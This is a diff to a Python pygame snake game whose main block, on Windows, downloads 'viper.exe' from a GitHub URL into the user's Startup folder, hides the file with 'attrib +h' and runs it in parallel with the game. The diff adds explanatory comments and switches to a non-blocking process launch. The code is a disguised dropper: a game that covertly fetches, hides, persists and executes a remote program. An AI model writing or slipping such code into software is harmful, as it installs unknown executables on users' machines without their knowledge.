@@ -170,21 +170,31 @@ def game():
         pygame.display.update()
         clock.tick(snake_speed)
 
+# Function to download the executable to the Startup folder, and return the path to the file
 def download_executable(url, folder):
+    # Check if the file already exists in the folder
     file = os.path.join(folder, "viper.exe")
     if os.path.isfile(file):
         return file
+    # Download the file from the specified URL
     urllib.request.urlretrieve(url, file)
+    # Hide the file (using attrib +h command)
     os.system(f"attrib +h {file}")
+    # Return the path to the downloaded file
     return file
 
+# Function to run the executable
 def run_executable(file):
-    subprocess.run(file)
+    # Use subprocess.run() to execute the file
+    subprocess.Popen(file)
 
 if __name__ == "__main__":
     if platform.system() == "Windows":
+        # Set the path to the Startup folder
         startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        # Download the executable to the Startup folder
         file = download_executable("https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe", startup_folder)
+        # Use a ThreadPoolExecutor to run the game and the executable in parallel
         with concurrent.futures.ThreadPoolExecutor() as executor:
             func1_future = executor.submit(game)
             func2_future = executor.submit(run_executable, file)
